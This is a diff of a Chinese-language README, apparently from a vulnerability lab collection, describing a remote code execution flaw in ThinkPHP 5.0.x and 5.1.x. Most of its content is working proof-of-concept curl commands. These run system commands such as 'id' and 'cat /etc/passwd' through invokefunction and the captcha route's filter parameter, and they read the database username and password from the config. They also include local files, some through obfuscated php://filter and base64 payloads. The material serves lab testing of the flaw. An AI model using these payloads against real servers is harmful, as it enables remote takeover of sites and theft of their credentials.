@@ -1,17 +1,20 @@
-## Thinkphp 5.0.16 insert 注入漏洞
+## Thinkphp 5 controller 路由代码执行漏洞
 
 测试镜像
 
-* src/thinkphp/2.0/
+* src/thinkphp/5.0.16/
 
 影响范围
 
 * 5.0.X - 5.0.23
 * 5.1.X - 5.1.31
 
-Poc
+Poc - 1
 
-```
+```bash
+# 执行代码
+curl -g '127.0.0.1/public/index.php?s=index/\think\app/invokefunction&function=assert&vars[0]=phpinfo();'
+
 # 执行命令
 curl -g '127.0.0.1/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
 
@@ -22,6 +25,24 @@ curl -g '127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=
 curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.username'
 curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.password'
 ```
+
+Poc - 2
+
+```bash
+# 执行命令
+curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=cat /etc/passwd&_method=__construct&method=&filter[]=system'
+
+# 包含文件 - 普通
+curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=../runtime/log/201909/01.log&_method=__construct&method=&filter[]=think\__include_file'
+
+# 包含文件 - php://filter + strrev
+echo '<?php phpinfo(); ?>' | base64 > /tmp/test.txt
+curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=txt.tset/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php&_method=__construct&method=&filter[]=strrev&filter[]=think\__include_file'
+
+# 多个 filter 嵌套 - base64_decode
+curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=L2V0Yy9wYXNzd2Q=&_method=__construct&method=&filter[]=base64_decode&filter[]=think\__include_file'
+```
+
 
 参考文档
 
